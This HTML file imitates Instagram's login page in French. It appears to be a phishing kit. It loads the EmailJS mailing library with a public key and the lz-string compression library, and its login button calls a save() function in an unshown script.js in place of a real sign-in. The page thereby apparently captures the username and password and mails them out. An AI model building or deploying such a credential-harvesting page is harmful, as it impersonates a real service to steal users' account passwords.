<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram login</title>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "KO8PrzvnthE2OFmmb",
      });
   })();
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
<script src="script.js"></script>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">Num.téléphone, nom d'utilisateur(ice) ou e-mail</label>
                    <input id="id" name="email" placeholder="Num.téléphone, nom d'utilisateur(ice) ou e-mail" />

                    <label for="password" class="sr-only">Mot de passe</label>
                    <input id="pass" name="password" type="password" placeholder="Mot de passe" />

                    <button type="button" onclick="save()">Se connecter</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Se connecter avec Facebook</a>
                    </div>
                    <a href="#">Mot de passe oublié ?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Vous n'avez pas de compte ?</p>
                <a href="#">Inscrivez-vous</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Télechargez l'application.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
</body>
</html>
